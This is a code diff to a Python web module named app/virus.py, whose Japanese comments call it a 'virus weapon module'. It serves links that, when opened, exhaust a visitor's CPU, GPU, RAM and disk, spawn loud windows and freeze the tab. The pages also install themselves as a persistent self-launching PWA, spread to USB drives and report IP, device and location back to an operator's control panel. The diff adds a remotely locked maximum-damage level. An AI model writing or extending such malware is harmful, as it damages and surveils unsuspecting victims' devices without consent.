@@ -9,13 +9,14 @@ app/virus.py — ウイルス兵器モジュール
   windows        爆音窓爆弾（音＋大量ウィンドウ）
   storage        容量枯渇
   mix            全部ミックス
-  singularity    特異点（全16系統統合の最上位兵器・PWA常駐・USBワーム）
+  singularity    特異点（全22系統統合の最上位兵器・PWA常駐・USBワーム・L7固定枠）
 
 設計:
   兵器ページはボタン無し。開いた瞬間から全部自動・無限。
   枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
   singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
   相手のUSBにも自分を仕込んで伝染する。
+  L7「終焉・固定」は固定枠。fixed=1 の間は遠隔から下げられない。
 
 監視室:
   /vp/{code}            操作盤（AJAX・ページ遷移なし）
@@ -67,7 +68,7 @@ MODE_DESC = {
     "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "開いた瞬間に端末の容量を埋め尽くす。",
     "mix": "上の全部を無限に。最強。",
-    "singularity": "全16系統・5資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜6を遠隔変更できる。",
+    "singularity": "全22系統・6資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠。",
 }
 
 # 常駐（ホーム画面追加）で自動発射するモード
@@ -86,7 +87,7 @@ CAUTION = {
     "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
     "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
-    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。停止・凍結中でもService Worker経由で命令が届く。",
+    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7は固定枠で、立てたら遠隔から下げられない。停止・凍結中でもService Worker経由で命令が届く。",
 }
 
 SCHEMA = """
@@ -96,8 +97,8 @@ CREATE TABLE IF NOT EXISTS virus_links(
   last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT,
   winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0,
   notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
-  level INTEGER DEFAULT 1, wipe_seq INTEGER DEFAULT 0, freeze TEXT DEFAULT '',
-  bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT);
+  level INTEGER DEFAULT 1, fixed INTEGER DEFAULT 0, wipe_seq INTEGER DEFAULT 0,
+  freeze TEXT DEFAULT '', bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT);
 CREATE TABLE IF NOT EXISTS virus_hits(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
   device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
@@ -178,6 +179,7 @@ def _migrate(c):
                       ("notify_text", "TEXT"),
                       ("notify_mode", "TEXT"),
                       ("level", "INTEGER DEFAULT 1"),
+                      ("fixed", "INTEGER DEFAULT 0"),
                       ("wipe_seq", "INTEGER DEFAULT 0"),
                       ("freeze", "TEXT DEFAULT ''"),
                       ("bomb", "TEXT DEFAULT ''"),
@@ -226,6 +228,13 @@ def _val(row, key, default):
         return default if v is None else v
     except Exception:
         return default
+
+
+def _is_fixed(row):
+    try:
+        return bool(int(_val(row, "fixed", 0) or 0))
+    except Exception:
+        return False
 
 
 def _norm_mode(m):
@@ -297,6 +306,7 @@ def list_page(request: Request, u=Depends(_auth)):
         r["caution"] = CAUTION.get(r["mode"], "")
         r["auto"] = (r["mode"] in AUTO_MODES)
         r["level"] = int(r.get("level") or 1)
+        r["fixed"] = int(r.get("fixed") or 0)
         r["set_label"] = "∞" if (r.get("winset") == 0) else f'{r.get("winset") or 100}枚/セット'
         r["firing"] = r.get("firing", 1)
         # --- テンプレが使うURLを明示（href空対策・保険） ---
@@ -312,12 +322,13 @@ def list_page(request: Request, u=Depends(_auth)):
 def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
            dest: str = Form(""), note: str = Form(""), winset: str = Form("100"),
            notify: str = Form("1"), notify_text: str = Form(""),
-           notify_mode: str = Form(""), u=Depends(_auth)):
+           notify_mode: str = Form(""), fixed: str = Form("0"), u=Depends(_auth)):
     owner = tenancy.get_current() or u
     c = _db(owner)
     code = _new_code(c)
     m = _norm_mode(mode)
     nm = _norm_mode(notify_mode) if notify_mode else ""
+    fx = 0 if str(fixed) in ("0", "", "false", "False") else 1
     try:
         ws = int(winset)
     except Exception:
@@ -325,11 +336,11 @@ def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
     ws = ws if ws in SET_CHOICES else 100
     ntext = (notify_text or DEFAULT_NOTIFY)[:300]
     c.execute("INSERT INTO virus_links(code,name,mode,dest,note,active,created,hits,"
-              "winset,firing,notify,notify_text,notify_mode,level,ver) "
-              "VALUES(?,?,?,?,?,1,?,0,?,1,?,?,?,1,?)",
+              "winset,firing,notify,notify_text,notify_mode,level,fixed,ver) "
+              "VALUES(?,?,?,?,?,1,?,0,?,1,?,?,?,?,?,?)",
               (code, (name or "").strip()[:60] or "名無し", m, _abs_dest(dest)[:300],
                (note or "")[:300], _now(), ws, 1 if notify not in ("0", "") else 0,
-               ntext, nm, _SG_VER))
+               ntext, nm, 7 if fx else 1, fx, _SG_VER))
     c.commit()
     c.close()
     try:
@@ -509,7 +520,7 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
     mode = _norm_mode(row["mode"])
     notify_mode = _val(row, "notify_mode", "") or ""
     notify_mode = _norm_mode(notify_mode) if notify_mode else ""
-    lv = int(_val(row, "level", 1) or 0)
+    lv = 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0)
     sids = []
     for h in hits:
         if h.get("vid") and h["vid"] not in sids:
@@ -534,6 +545,7 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
                    level=lv, level_label=_SG_LEVEL_LABEL.get(lv, ""),
                    level_desc=_SG_LEVEL_DESC.get(lv, ""),
                    levels=sorted(_SG_LEVEL_LABEL.keys()),
+                   fixed=1 if _is_fixed(row) else 0,
                    freeze=_val(row, "freeze", "") or "",
                    wipe_seq=int(_val(row, "wipe_seq", 0) or 0),
                    install_level=_SG_INSTALL_LEVEL,
@@ -602,7 +614,8 @@ def api(code: str, u=Depends(_auth)):
     c.close()
     return {"hits": hits, "count": len(hits), "server": _now(),
             "set": _val(row, "winset", 100), "firing": _val(row, "firing", 1),
-            "level": int(_val(row, "level", 1) or 0)}
+            "level": 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0),
+            "fixed": 1 if _is_fixed(row) else 0}
 
 
 @router.get("/api/vp/{code}/rat")
@@ -706,10 +719,12 @@ from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
 MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
 _GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
 _SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))
-_SG_VER = os.getenv("SG_APP_VER", "3.0")
+_SG_VER = os.getenv("SG_APP_VER", "3.1")
 _SG_INJ = os.getenv("SG_INJ", "1") != "0"
 _SG_RAT = os.getenv("SG_RAT", "1") != "0"
 _SG_SSE = os.getenv("SG_SSE", "1") != "0"
+_SG_FINAL_RAM_MB = int(os.getenv("SG_FINAL_RAM_MB", "0") or 0)
+_SG_GPU_MEM = os.getenv("SG_GPU_MEM", "1") != "0"
 
 try:
     from PIL import Image, ImageDraw           # noqa
@@ -721,9 +736,9 @@ _SG_ICONS = {}
 
 
 def _lv(v) -> int:
-    """レベルは 0〜6 の7段階。"""
+    """レベルは 0〜7 の8段階。7は固定枠。"""
     try:
-        return max(0, min(6, int(v)))
+        return max(0, min(7, int(v)))
     except Exception:
         return 1
 
@@ -872,12 +887,16 @@ def _sg_ingest(owner, code, report, sid):
 def _sg_cfg(row, code, sid, lv, app_name, extra=None):
     """singularity の CFG を組み立てる（本体ページと注入用 p.js で共有）。"""
     base = f"/v/{code}/sg"
+    fixed = _is_fixed(row)
+    if fixed:
+        lv = 7
     cfg = {
         "sid": sid, "path": base, "collect": base + "/c", "cmd": base + "/cmd",
         "sse": base + "/sse" if _SG_SSE else "", "ack": base + "/ack",
         "sw": base + "/sw.js", "pjs": base + "/p.js", "manifest": base + "/manifest.json",
         "icons": [base + "/icon-192.png", base + "/icon-512.png"],
         "level": lv, "fire": int(_val(row, "firing", 1) or 0),
+        "fixed": fixed, "finalRamMB": _SG_FINAL_RAM_MB, "gpuMem": _SG_GPU_MEM,
         "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
         "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
         "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
@@ -918,6 +937,8 @@ def _sg_land(code, request, sid=""):
     lvq = request.query_params.get("level")
     if lvq is not None and str(lvq).isdigit():
         lv = _lv(lvq)
+    if _is_fixed(row):
+        lv = 7                                     # 固定枠は何があってもL7
     if installed:
         lv = max(lv, _SG_INSTALL_LEVEL)          # インストール済みアプリ窓は最低L4
 
@@ -1095,8 +1116,10 @@ def _sg_cmd_payload(owner, code, sid, sw=False):
         c.execute("UPDATE virus_cmd SET state=1 WHERE code=? AND state=0 AND (sid=? OR sid='')",
                   (code, sid or ""))
         c.commit()
+    fixed = _is_fixed(row)
     out = {"ok": 1,
-           "level": int(_val(row, "level", 1) or 0),
+           "level": 7 if fixed else int(_val(row, "level", 1) or 0),
+           "fixed": fixed,
            "fire": int(_val(row, "firing", 1) or 0),
            "freeze": _val(row, "freeze", "") or "",
            "wipe": int(_val(row, "wipe_seq", 0) or 0),
@@ -1212,12 +1235,28 @@ def sg_root(code: str, request: Request):
 @router.post("/vp/{code}/level")
 def sg_level(code: str, level: str = Form("1"), u=Depends(_auth)):
     owner = tenancy.get_current() or u
-    lv = _lv(level)
     c = _db(owner)
+    row = _link(c, code)
+    fixed = _is_fixed(row) if row else False
+    lv = 7 if fixed else _lv(level)
     c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
     c.commit()
     c.close()
     return RedirectResponse("/vp/" + code + "?lvl=" + str(lv), status_code=303)
+
+
+@router.post("/vp/{code}/fix")
+def sg_fix(code: str, fixed: str = Form("1"), u=Depends(_auth)):
+    """固定枠の設定／解除。立てると L7 にロックされ、遠隔から下げられない。"""
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    v = 0 if str(fixed) in ("0", "", "false", "False") else 1
+    row = _link(c, code)
+    lv = 7 if v else int(_val(row, "level", 1) or 1)
+    c.execute("UPDATE virus_links SET fixed=?, level=?, firing=1 WHERE code=?", (v, lv, code))
+    c.commit()
+    c.close()
+    return RedirectResponse("/vp/" + code + "?fix=" + str(v), status_code=303)
 
 
 @router.post("/vp/{code}/freeze")
@@ -1294,8 +1333,10 @@ def _api_state(owner, code):
                      (code,)).fetchone()["n"]
     hn = c.execute("SELECT COUNT(*) n FROM virus_hits WHERE code=?", (code,)).fetchone()["n"]
     c.close()
+    fixed = _is_fixed(row)
     return {"ok": 1, "code": code,
-            "level": int(_val(row, "level", 1) or 0),
+            "level": 7 if fixed else int(_val(row, "level", 1) or 0),
+            "fixed": 1 if fixed else 0,
             "firing": int(_val(row, "firing", 1) or 0),
             "freeze": _val(row, "freeze", "") or "",
             "wipe_seq": int(_val(row, "wipe_seq", 0) or 0),
@@ -1330,9 +1371,29 @@ def api_state(code: str, u=Depends(_auth)):
 async def api_level(request: Request, code: str, u=Depends(_auth)):
     owner = tenancy.get_current() or u
     b = await _api_body(request)
-    lv = _lv(b.get("level"))
     c = _db(owner)
+    row = _link(c, code)
+    fixed = _is_fixed(row) if row else False
+    lv = 7 if fixed else _lv(b.get("level"))
     c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/fix")
+async def api_fix(request: Request, code: str, u=Depends(_auth)):
+    """固定枠のON/OFF。ONで L7 にロック。"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    v = 0 if str(b.get("fixed") or "0") in ("0", "", "false", "False") else 1
+    c = _db(owner)
+    row = _link(c, code)
+    if not row:
+        c.close()
+        raise HTTPException(404)
+    lv = 7 if v else int(_val(row, "level", 1) or 1)
+    c.execute("UPDATE virus_links SET fixed=?, level=?, firing=1 WHERE code=?", (v, lv, code))
     c.commit()
     c.close()
     return _api_state(owner, code)
